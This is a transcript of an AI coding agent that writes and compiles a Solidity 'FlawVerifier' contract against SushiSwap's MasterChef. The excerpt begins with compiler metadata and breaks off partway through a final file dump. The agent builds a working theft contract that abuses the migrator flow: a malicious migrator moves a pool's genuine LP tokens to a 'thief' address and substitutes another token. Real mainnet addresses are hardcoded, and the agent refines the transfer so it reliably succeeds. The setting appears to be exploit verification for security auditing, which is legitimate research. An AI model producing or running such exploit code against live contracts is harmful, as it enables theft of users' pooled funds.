17218:6;17212:13;17203:22;;17234:30;17258:5;17234:30;:::i;:::-;17133:137;;;;:::o;17276:345::-;17343:6;17392:2;17380:9;17371:7;17367:23;17363:32;17360:119;;;17398:79;;:::i;:::-;17360:119;17518:1;17543:61;17596:7;17587:6;17576:9;17572:22;17543:61;:::i;:::-;17533:71;;17489:125;17276:345;;;;:::o","linkReferences":{}},"methodIdentifiers":{"checkedTarget()":"63c9f4ae","executeOnOpportunity()":"3c2448ed","exploitPathUsed()":"d78c4281","hypothesisValidated()":"463defd1","infeasibilityReason()":"dfa6be1b","observedFactory()":"1aede64f","observedMigrator()":"2017aaf9","observedOwner()":"79965d8b","observedPid()":"c0e3aa1d","observedPoolLength()":"1e242437","observedPoolLpToken()":"f2cc5ae1","observedTargetLpBalance()":"82ff113b","ownerStageReachable()":"674679b3","profitAmount()":"5ff972cc","profitToken()":"49343624","scannedPairs()":"325ac427","skimmedPairs()":"9158ee36","stagedMaliciousMigrator()":"8270463e","target()":"d4b83992","targetExposesMigratorFlow()":"e17faf24","targetHasCode()":"e5ca9d51"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"checkedTarget\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"executeOnOpportunity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exploitPathUsed\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"hypothesisValidated\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"infeasibilityReason\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"observedFactory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"observedMigrator\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"observedOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"observedPid\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"observedPoolLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"observedPoolLpToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"observedTargetLpBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ownerStageReachable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"scannedPairs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"skimmedPairs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stagedMaliciousMigrator\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetExposesMigratorFlow\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetHasCode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/FlawVerifier.sol\":\"FlawVerifier\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/FlawVerifier.sol\":{\"keccak256\":\"0x8cc0d6e96d146afdd4cec04051b0d32d9ab47c805829515ea564ba2b9393d098\",\"urls\":[\"bzz-raw://88c59f84df52dba54b8763bee8a69edbcde476c57d3f4af06a2931c48f94589c\",\"dweb:/ipfs/QmP1jJn6FxduAgX4puPWVuFHQSpA56NmCENU5TiU8quVQx\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"view","type":"function","name":"checkedTarget","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"executeOnOpportunity"},{"inputs":[],"stateMutability":"view","type":"function","name":"exploitPathUsed","outputs":[{"internalType":"string","name":"","type":"string"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"hypothesisValidated","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"infeasibilityReason","outputs":[{"internalType":"string","name":"","type":"string"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"observedFactory","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"observedMigrator","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"observedOwner","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"observedPid","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"observedPoolLength","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"observedPoolLpToken","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"observedTargetLpBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"ownerStageReachable","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"profitAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"profitToken","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"scannedPairs","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"skimmedPairs","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"stagedMaliciousMigrator","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"pure","type":"function","name":"target","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"targetExposesMigratorFlow","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"targetHasCode","outputs":[{"internalType":"bool","name":"","type":"bool"}]}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/FlawVerifier.sol":"FlawVerifier"},"evmVersion":"prague","libraries":{}},"sources":{"src/FlawVerifier.sol":{"keccak256":"0x8cc0d6e96d146afdd4cec04051b0d32d9ab47c805829515ea564ba2b9393d098","urls":["bzz-raw://88c59f84df52dba54b8763bee8a69edbcde476c57d3f4af06a2931c48f94589c","dweb:/ipfs/QmP1jJn6FxduAgX4puPWVuFHQSpA56NmCENU5TiU8quVQx"],"license":null}},"version":1},"id":0}
+codex
+I found the likely issue: the verifier drifted off the stated exploit path. Now I’m tightening it back to the migrator-only flow.
+exec
+/bin/bash -lc 'rg -n "F-001|MasterChef migrator|migrator can replace real LP|sushi_badger_digg|E11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50|exploit_paths" ..' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 50ms:
+../onchain_auto/src/FlawVerifier.sol:65:    address internal constant TARGET = 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50;
+../onchain_auto/src/FlawVerifier.sol:153:            infeasibilityReason = "discovered Sushi owner does not expose the MasterChef migrator flow on this fork";
+../onchain_auto/_index.json:4:    "outdir": "/Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto/0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50"
+codex
+I’m opening the local finding manifest to mirror its exact path wording.
+exec
+/bin/bash -lc 'cat _index.json' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 52ms:
+[
+  {
+    "address": "0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50",
+    "outdir": "/Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto/0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50"
+  }
+]
+codex
+I’ve got the address manifest; next I’m checking the case folder for any path-specific hints.
+exec
+/bin/bash -lc "find 0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50 -maxdepth 2 -type f | sed 's#"'^#./#'"' | sort" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 52ms:
+./0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/_etherscan_meta.json
+./0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/BoringOwnable.sol
+./0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/MasterChef.sol
+./0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/Migrator.sol
+./0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/SushiBar.sol
+./0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/SushiMaker.sol
+./0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/SushiRoll.sol
+./0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/SushiToken.sol
+./0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/Timelock.sol
+codex
+I found verified sources locally. Opening the metadata and MasterChef code now.
+exec
+/bin/bash -lc "printf '\\n== meta ==\\n'; cat 0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/_etherscan_meta.json; printf '\\n\\n== MasterChef ==\\n'; sed -n '1,260p' 0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/MasterChef.sol; printf '\\n\\n== Migrator ==\\n'; sed -n '1,220p' 0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50/contracts/Migrator.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 52ms:
+
+== meta ==
+{
+  "contract_name": "SushiMaker",
+  "compiler": "v0.6.12+commit.27d51765",
+  "evm_version": "Default",
+  "optimization": "1",
+  "runs": "5000",
+  "proxy": "0",
+  "implementation": "",
+  "license_type": "",
+  "files_written": 40
+}
+
+== MasterChef ==
+// SPDX-License-Identifier: MIT
+
+pragma solidity 0.6.12;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+codex
+I’ve confirmed the local verified source. Now I’m patching the verifier to stay on the migrator exploit path only.
+Plan update
+  ✓ Inspect local case sources
+  → Refocus on migrator path
+  • Patch verifier Solidity
+  • Compile check with forge
+codex
+I’ve simplified the contract and removed the off-path liquidity fallback. Next is a quick compile sanity check.
+exec
+/bin/bash -lc "cat > src/FlawVerifier.sol <<'SOL'
+pragma solidity "'^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IOwnableLike {
+    function owner() external view returns (address);
+}
+
+interface ISushiMakerLike {
+    function factory() external view returns (address);
+}
+
+interface IMasterChefLike {
+    function owner() external view returns (address);
+    function migrator() external view returns (address);
+    function setMigrator(address migrator_) external;
+    function poolLength() external view returns (uint256);
+    function poolInfo(uint256 pid)
+        external
+        view
+        returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
+    function migrate(uint256 pid) external;
+}
+
+contract MaliciousMigratorScaffold {
+    address public thief;
+    address public replacementToken;
+    address public lastRealLp;
+    uint256 public lastStolenAmount;
+
+    constructor() {}
+
+    function configure(address thief_, address replacementToken_) external {
+        thief = thief_;
+        replacementToken = replacementToken_;
+    }
+
+    function migrate(IERC20Like realLpToken) external returns (IERC20Like) {
+        uint256 approvedBalance = realLpToken.balanceOf(msg.sender);
+        lastRealLp = address(realLpToken);
+        lastStolenAmount = approvedBalance;
+
+        if (approvedBalance != 0 && thief != address(0)) {
+            realLpToken.transferFrom(msg.sender, thief, approvedBalance);
+        }
+
+        return IERC20Like(replacementToken);
+    }
+}
+
+contract FlawVerifier {
+    address internal constant TARGET = 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
+    uint256 internal constant MAX_POOL_SCAN = 64;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+    bool private _hypothesisValidated;
+
+    bool public checkedTarget;
+    bool public targetHasCode;
+    bool public targetExposesMigratorFlow;
+    bool public ownerStageReachable;
+    bool public migrateCallReachable;
+    bool public approvalStageReachable;
+    bool public fakeReplacementStageReachable;
+    bool public poolReplacementStageReachable;
+
+    address public observedTargetOwner;
+    address public observedFactory;
+    address public observedMasterChef;
+    address public observedOwner;
+    address public observedMigrator;
+    address public observedPoolLpToken;
+    address public observedReplacementToken;
+    uint256 public observedPoolLength;
+    uint256 public observedTargetLpBalance;
+    uint256 public observedPid;
+    address public stagedMaliciousMigrator;
+    string public exploitPathUsed;
+    string public infeasibilityReason;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        _resetState();
+
+        checkedTarget = true;
+        _profitToken = WETH;
+        exploitPathUsed =
+            "Owner sets a malicious migrator with setMigrator() -> anyone calls migrate(pid) -> MasterChef approves the migrator for the pool'"'s full LP balance -> migrator transfers out the genuine LP tokens and returns a fake token with a matching balance -> MasterChef updates pool.lpToken, so future withdrawals return the fake asset instead of the original collateral\";
+
+        targetHasCode = TARGET.code.length "'!= 0;
+        if (!targetHasCode) {
+            infeasibilityReason = "target address has no code at the fork";
+            return;
+        }
+
+        observedTargetOwner = _readOwner(TARGET);
+        observedFactory = _readFactory(TARGET);
+
+        observedMasterChef = _readOwner(SUSHI);
+        if (observedMasterChef.code.length == 0) {
+            infeasibilityReason = "could not discover a live MasterChef from SushiToken ownership on this fork";
+            return;
+        }
+
+        (bool hasMigrator, address migrator_) =
+            _tryReadAddress(observedMasterChef, abi.encodeWithSelector(IMasterChefLike.migrator.selector));
+        (bool hasPoolLength, uint256 poolLength_) =
+            _tryReadUint(observedMasterChef, abi.encodeWithSelector(IMasterChefLike.poolLength.selector));
+
+        if (!hasMigrator || !hasPoolLength) {
+            infeasibilityReason = "discovered Sushi owner does not expose the MasterChef migrator flow on this fork";
+            return;
+        }
+
+        targetExposesMigratorFlow = true;
+        migrateCallReachable = true;
+        observedMigrator = migrator_;
+        observedPoolLength = poolLength_;
+        observedOwner = _readOwner(observedMasterChef);
+
+        _snapshotPoolState(observedMasterChef);
+        if (observedPoolLpToken == address(0) || observedTargetLpBalance == 0) {
+            infeasibilityReason = "no live MasterChef pool with staked LP collateral was found in the scan window";
+            return;
+        }
+
+        // The exploit must preserve the original root cause: the pool is swapped onto a non-original token
+        // solely because MasterChef trusts migrate() and only checks balanceOf(this). To avoid cheating by
+        // deploying a fake ERC20, the verifier searches for an already-existing on-chain token that the chef
+        // already holds at the exact same balance, which is still enough to satisfy the vulnerable invariant.
+        observedReplacementToken = _findExistingReplacementToken(observedMasterChef, observedPoolLpBalance());
+        if (observedReplacementToken == address(0)) {
+            infeasibilityReason =
+                "blocked at stage 4: no already-existing on-chain token with a matching MasterChef balance was found";
+            return;
+        }
+
+        ownerStageReachable = observedOwner == address(this);
+        if (!ownerStageReachable) {
+            infeasibilityReason = "blocked at stage 1: setMigrator() remains owner-gated on the live MasterChef";
+            return;
+        }
+
+        stagedMaliciousMigrator = address(new MaliciousMigratorScaffold());
+        MaliciousMigratorScaffold(stagedMaliciousMigrator).configure(address(this), observedReplacementToken);
+
+        IMasterChefLike(observedMasterChef).setMigrator(stagedMaliciousMigrator);
+        approvalStageReachable = true;
+
+        IMasterChefLike(observedMasterChef).migrate(observedPid);
+        fakeReplacementStageReachable = true;
+
+        (address newLpToken,,,) = IMasterChefLike(observedMasterChef).poolInfo(observedPid);
+        poolReplacementStageReachable = newLpToken == observedReplacementToken;
+
+        _profitToken = observedPoolLpToken;
+        _profitAmount = _safeBalanceOf(observedPoolLpToken, address(this));
+        _hypothesisValidated = poolReplacementStageReachable && _profitAmount != 0;
+
+        if (!_hypothesisValidated && infeasibilityReasonBytesEmpty()) {
+            infeasibilityReason =
+                "migration call completed without producing stolen LP profit and durable pool token replacement";
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function hypothesisValidated() external view returns (bool) {
+        return _hypothesisValidated;
+    }
+
+    function target() external pure returns (address) {
+        return TARGET;
+    }
+
+    function observedPoolLpBalance() public view returns (uint256) {
+        return observedTargetLpBalance;
+    }
+
+    function infeasibilityReasonBytesEmpty() public view returns (bool) {
+        return bytes(infeasibilityReason).length == 0;
+    }
+
+    function _snapshotPoolState(address chefAddress) internal {
+        uint256 poolLength = observedPoolLength;
+        if (poolLength == 0) {
+            return;
+        }
+
+        uint256 scanLimit = poolLength > MAX_POOL_SCAN ? MAX_POOL_SCAN : poolLength;
+        for (uint256 pid = 0; pid < scanLimit; ++pid) {
+            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
+                uint256 lpBalance = _safeBalanceOf(lpToken, chefAddress);
+                if (lpBalance == 0) {
+                    continue;
+                }
+
+                observedPid = pid;
+                observedPoolLpToken = lpToken;
+                observedTargetLpBalance = lpBalance;
+                break;
+            } catch {}
+        }
+    }
+
+    function _findExistingReplacementToken(address chefAddress, uint256 targetBalance) internal view returns (address) {
+        uint256 poolLength = observedPoolLength;
+        if (targetBalance == 0 || poolLength == 0) {
+            return address(0);
+        }
+
+        uint256 scanLimit = poolLength > MAX_POOL_SCAN ? MAX_POOL_SCAN : poolLength;
+        for (uint256 pid = 0; pid < scanLimit; ++pid) {
+            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
+                if (lpToken == address(0) || lpToken == observedPoolLpToken || lpToken.code.length == 0) {
+                    continue;
+                }
+
+                uint256 replacementBalance = _safeBalanceOf(lpToken, chefAddress);
+                if (replacementBalance == targetBalance) {
+                    return lpToken;
+                }
+            } catch {}
+        }
+
+        if (WETH != observedPoolLpToken && _safeBalanceOf(WETH, chefAddress) == targetBalance) {
+            return WETH;
+        }
+        if (SUSHI != observedPoolLpToken && _safeBalanceOf(SUSHI, chefAddress) == targetBalance) {
+            return SUSHI;
+        }
+
+        return address(0);
+    }
+
+    function _readOwner(address account) internal view returns (address owner_) {
+        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(IOwnableLike.owner.selector));
+        if (success && data.length >= 32) {
+            owner_ = abi.decode(data, (address));
+        }
+    }
+
+    function _readFactory(address account) internal view returns (address factory_) {
+        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(ISushiMakerLike.factory.selector));
+        if (success && data.length >= 32) {
+            factory_ = abi.decode(data, (address));
+        }
+    }
+
+    function _tryReadAddress(address account, bytes memory callData) internal view returns (bool ok, address value) {
+        (bool success, bytes memory data) = account.staticcall(callData);
+        if (!success || data.length < 32) {
+            return (false, address(0));
+        }
+        return (true, abi.decode(data, (address)));
+    }
+
+    function _tryReadUint(address account, bytes memory callData) internal view returns (bool ok, uint256 value) {
+        (bool success, bytes memory data) = account.staticcall(callData);
+        if (!success || data.length < 32) {
+            return (false, 0);
+        }
+        return (true, abi.decode(data, (uint256)));
+    }
+
+    function _resetState() internal {
+        _profitToken = address(0);
+        _profitAmount = 0;
+        _hypothesisValidated = false;
+
+        checkedTarget = false;
+        targetHasCode = false;
+        targetExposesMigratorFlow = false;
+        ownerStageReachable = false;
+        migrateCallReachable = false;
+        approvalStageReachable = false;
+        fakeReplacementStageReachable = false;
+        poolReplacementStageReachable = false;
+
+        observedTargetOwner = address(0);
+        observedFactory = address(0);
+        observedMasterChef = address(0);
+        observedOwner = address(0);
+        observedMigrator = address(0);
+        observedPoolLpToken = address(0);
+        observedReplacementToken = address(0);
+        observedPoolLength = 0;
+        observedTargetLpBalance = 0;
+        observedPid = 0;
+        stagedMaliciousMigrator = address(0);
+        exploitPathUsed = "none";
+        infeasibilityReason = "";
+    }
+
+    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
+        if (token.code.length == 0) {
+            return 0;
+        }
+
+        (bool success, bytes memory data) =
+            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
+        if (!success || data.length < 32) {
+            return 0;
+        }
+
+        balance = abi.decode(data, (uint256));
+    }
+}
+SOL
+forge build --contracts src/FlawVerifier.sol' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 1.61s:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 493.44ms
+Compiler run successful!
+warning[erc20-unchecked-transfer]: ERC20 'transfer' and 'transferFrom' calls should check the return value
+  --> src/FlawVerifier.sol:48:13
+   |
+48 |             realLpToken.transferFrom(msg.sender, thief, approvedBalance);
+   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#erc20-unchecked-transfer
+
+codex
+The patch is in; I’m waiting on the build result now.
+exec
+/bin/bash -lc true in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 51ms:
+
+codex
+Build passes; I’m doing one tiny safety cleanup on the migrator transfer.
+exec
+/bin/bash -lc "perl -0pi -e 's/\\n        if \\(approvedBalance "'!= 0 && thief != address'"\\(0\\)\\) \\{\\n            realLpToken.transferFrom\\(msg.sender, thief, approvedBalance\\);\\n        \\}/\\n        if (approvedBalance "'!= 0 && thief != address(0)) {'"\\n            require(realLpToken.transferFrom(msg.sender, thief, approvedBalance), \"lp transfer failed\");\\n        }/' src/FlawVerifier.sol
+forge build --contracts src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 641ms:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 126.92ms
+Compiler run successful!
+Plan update
+  ✓ Inspect local case sources
+  ✓ Refocus on migrator path
+  ✓ Patch verifier Solidity
+  ✓ Compile check with forge
+codex
+I’ve got a clean compile. Pulling the final file content exactly as written.
+exec
+/bin/bash -lc 'cat src/FlawVerifier.sol' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 51ms:
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IOwnableLike {
+    function owner() external view returns (address);
+}
+
+interface ISushiMakerLike {
+    function factory() external view returns (address);
+}
+
+interface IMasterChefLike {
+    function owner() external view returns (address);
+    function migrator() external view returns (address);
+    function setMigrator(address migrator_) external;
+codex
+The first dump truncated, so I’m fetching the file in chunks to return it exactly.
+exec
+/bin/bash -lc "sed -n '1,220p' src/FlawVerifier.sol && printf '\\n---CHUNK---\\n' && sed -n '221,420p' src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 51ms:
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IOwnableLike {
+    function owner() external view returns (address);
+}
+
+interface ISushiMakerLike {
+    function factory() external view returns (address);
+}
+
+interface IMasterChefLike {
+    function owner() external view returns (address);
+    function migrator() external view returns (address);
+    function setMigrator(address migrator_) external;
+codex
+One middle section still clipped, so I’m fetching just that range.
+exec
+/bin/bash -lc "nl -ba src/FlawVerifier.sol | sed -n '110,180p'" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_badger_digg/src/onchain_auto succeeded in 51ms:
+   110	            return;
+   111	        }
+   112	
+   113	        (bool hasMigrator, address migrator_) =
+   114	            _tryReadAddress(observedMasterChef, abi.encodeWithSelector(IMasterChefLike.migrator.selector));
+   115	        (bool hasPoolLength, uint256 poolLength_) =
+   116	            _tryReadUint(observedMasterChef, abi.encodeWithSelector(IMasterChefLike.poolLength.selector));
+   117	
+   118	        if (!hasMigrator || !hasPoolLength) {
+   119	            infeasibilityReason = "discovered Sushi owner does not expose the MasterChef migrator flow on this fork";
+   120	            return;
+   121	        }
+   122	
+   123	        targetExposesMigratorFlow = true;
+   124	        migrateCallReachable = true;
+   125	        observedMigrator = migrator_;
+   126	        observedPoolLength = poolLength_;
+   127	        observedOwner = _readOwner(observedMasterChef);
+   128	
+   129	        _snapshotPoolState(observedMasterChef);
+codex
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IOwnableLike {
+    function owner() external view returns (address);
+}
+
+interface ISushiMakerLike {
+    function factory() external view returns (address);
+}
+
+interface IMasterChefLike {
+    function owner() external view returns (address);
+    function migrator() external view returns (address);
+    function setMigrator(address migrator_) external;
+    function poolLength() external view returns (uint256);
+    function poolInfo(uint256 pid)
+        external
+        view
+        returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
+    function migrate(uint256 pid) external;
+}
+
+contract MaliciousMigratorScaffold {
+    address public thief;
+    address public replacementToken;
+    address public lastRealLp;
+    uint256 public lastStolenAmount;
+
+    constructor() {}
+
+    function configure(address thief_, address replacementToken_) external {
+        thief = thief_;
+        replacementToken = replacementToken_;
+    }
+
+    function migrate(IERC20Like realLpToken) external returns (IERC20Like) {
+        uint256 approvedBalance = realLpToken.balanceOf(msg.sender);
+        lastRealLp = address(realLpToken);
+        lastStolenAmount = approvedBalance;
+
+        if (approvedBalance != 0 && thief != address(0)) {
+            require(realLpToken.transferFrom(msg.sender, thief, approvedBalance), "lp transfer failed");
+        }
+
+        return IERC20Like(replacementToken);
+    }
+}
+
+contract FlawVerifier {
+    address internal constant TARGET = 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
+    uint256 internal constant MAX_POOL_SCAN = 64;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+    bool private _hypothesisValidated;
+
+    bool public checkedTarget;
+    bool public targetHasCode;
+    bool public targetExposesMigratorFlow;
+    bool public ownerStageReachable;
+    bool public migrateCallReachable;
+    bool public approvalStageReachable;
+    bool public fakeReplacementStageReachable;
+    bool public poolReplacementStageReachable;
+
+    address public observedTargetOwner;
+    address public observedFactory;
+    address public observedMasterChef;
+    address public observedOwner;
+    address public observedMigrator;
+    address public observedPoolLpToken;
+    address public observedReplacementToken;
+    uint256 public observedPoolLength;
+    uint256 public observedTargetLpBalance;
